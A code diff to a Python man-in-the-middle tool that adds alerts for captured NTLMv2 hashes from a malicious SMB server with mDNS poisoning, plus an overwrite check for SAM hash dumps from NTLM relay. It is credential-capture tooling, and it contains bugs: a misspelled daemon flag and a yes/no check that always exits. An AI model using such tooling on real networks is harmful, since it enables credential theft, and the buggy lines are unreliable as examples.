@@ -35,6 +35,19 @@ class SmbServerAttack(CommandSet):
         self.__mdns_poisoner = None
         self.__smbserver = None
         self.__attack = None
+        self.__alerts_dictionary = Manager().dict()
+        self.__define_alerts()
+        self.__alerts_hunter = None
+        self.__ntlmv2_collected = []
+
+    def __configure_alerts_thread(self):
+        self.__alerts_hunter = Thread(target=self.__display_alerts)
+        self.__alerts_hunter.dameon = True
+        self.__alerts_hunter.start()
+
+    def __define_alerts(self):
+        self.__alerts_dictionary["new_ntlmv2"] = 0
+        self.__alerts_dictionary["stop"] = 0
 
     def __ends_process_in_the_background(self):
         if self.__attack is not None and self.__attack.is_alive:
@@ -42,6 +55,10 @@ class SmbServerAttack(CommandSet):
             self.__attack.terminate()
             self.__attack.join()
             self.__attack = None
+            if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
+                self.__alerts_dictionary["stop"] = 1
+                self.__alerts_hunter.join()
+                self.__alerts_dictionary["stop"] = 0
         else:
             self._cmd.error_logger.error("There is not mss process in the background")
 
@@ -52,19 +69,24 @@ class SmbServerAttack(CommandSet):
         sys.stdout = open("/dev/null", "w")
         signal.signal(signal.SIGINT, self.__try_exit)
 
+    def __display_ntlmv2(self):
+        if self.__alerts_dictionary["new_ntlmv2"] == 1:
+            if self._cmd.terminal_lock.acquire(blocking=False):
+                self._cmd.async_alert(
+                    f"{LogSymbols.INFO.value} New ntlmv2 hash has been discovered"
+                )
+                self._cmd.terminal_lock.release()
+            self.__alerts_dictionary["new_ntlmv2"] = 0
+
+    def __display_alerts(self):
+        while self.__alerts_dictionary["stop"] == 0:
+            self.__display_ntlmv2()
+
     def __components_to_launch(self):
         mdns_thread = Thread(target=self.__mdns_poisoner.start_mdns_poisoning)
         mdns_thread.daemon = True
         mdns_thread.start()
-
-        # smbserver_thread = Thread(target=self.__smbserver.start_malicious_smbserver)
-        # smbserver_thread.daemon = True
-        # smbserver_thread.start()
         self.__smbserver.start_malicious_smbserver()
-
-        # I only wait for a thread because when you finish the process you have to finish
-        # smbserver_thread.join()
-        # mdns_thread.join()
 
     def __launch_necessary_components(self, args: argparse.Namespace) -> None:
         if args.Asynchronous:
@@ -119,11 +141,14 @@ class SmbServerAttack(CommandSet):
         if args.end_attack:
             self.__ends_process_in_the_background()
             return
-        if self.__attack != None:
+        if self.__attack is not None:
             self._cmd.error_logger.warning(
                 "The attack is already running in the background"
             )
             return
+
+        if args.Asynchronous:
+            self.__configure_alerts_thread()
 
         self.__mdns_poisoner = MDNS(
             self._cmd.LHOST,
@@ -134,7 +159,7 @@ class SmbServerAttack(CommandSet):
 
         # output in case of -SS command
         self.__smbserver = MaliciousSmbServer(
-            self._cmd.LHOST, self._cmd.LPORT, args.Asynchronous
+            self._cmd.LHOST, self._cmd.LPORT, args.Asynchronous, self.__ntlmv2_collected
         )
 
         self._cmd.info_logger.debug(
@@ -166,6 +191,9 @@ class SmbServerAttack(CommandSet):
         if self.__attack is not None and self.__attack.is_alive:
             self.__attack.terminate()
             self.__attack.join()
+            if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
+                self.__alerts_dictionary["stop"] = 1
+                self.__alerts_hunter.join()
 
 
 @with_default_category("Man in the middle attacks")
@@ -291,7 +319,6 @@ class NtlmRelay(CommandSet):
             self._cmd.error_logger.warning("Exiting smb relay attack ...")
 
     def __asynchronous_attack(self) -> None:
-        saved_file = ansi.style("logs/ntlm_relay.log", fg=ansi.fg.green)
         self._cmd.info_logger.info(
             f"Running ntlm relay on the background the results will be saved at: {self.__ouput_sam_dir}/{self.__output_sam_file} "
         )
@@ -326,6 +353,18 @@ class NtlmRelay(CommandSet):
                 )
             except FileNotFoundError:
                 pass
+
+    def __file_exits(self) -> bool:
+        exit = False
+        print(f"{self.__ouput_sam_dir}/{self.__output_sam_file}")
+        if os.path.exists(f"{self.__ouput_sam_dir}/{self.__output_sam_file}"):
+            self._cmd.error_logger.warning(
+                "The file will be overwrite, do you want to continue ?(y)"
+            )
+            output = input()
+            if output != "y" or output != "yes":
+                exit = True
+        return exit
 
     def __check_directory(self) -> bool:
         return os.path.isdir(self.__output_sam_dir) and os.access(
@@ -383,12 +422,17 @@ class NtlmRelay(CommandSet):
 
         self.__output_sam_file = f"{self._cmd.RHOST}_samhashes.sam"
 
+        exit_value = self.__file_exits()
+        if exit_value:
+            self._cmd.info_logger.info("Exiting ...")
+            return
+
         self.__configure_alert_thread()
 
         if args.end_attack:
             self.__ends_ntlm_relay()
             return
-        if self.__ntlm_relay_process != None:
+        if self.__ntlm_relay_process is not None:
             self._cmd.error_logger.warning(
                 "The attacks is already running in the background "
             )
@@ -473,7 +517,7 @@ class NtlmRelay(CommandSet):
             self._cmd.info_logger.debug("Finishing ntlm_relay process ...")
             self.__ntlm_relay_process.terminate()
             self.__ntlm_relay_process.join()
-        if self.__alerts_hunter != None and self.__alerts_hunter.is_alive():
+        if self.__alerts_hunter is not None and self.__alerts_hunter.is_alive():
             self.__alerts_dictionary["stop"] = 1
             self._cmd.info_logger.debug("Finishing alerts thread ...")
             self.__alerts_hunter.join()
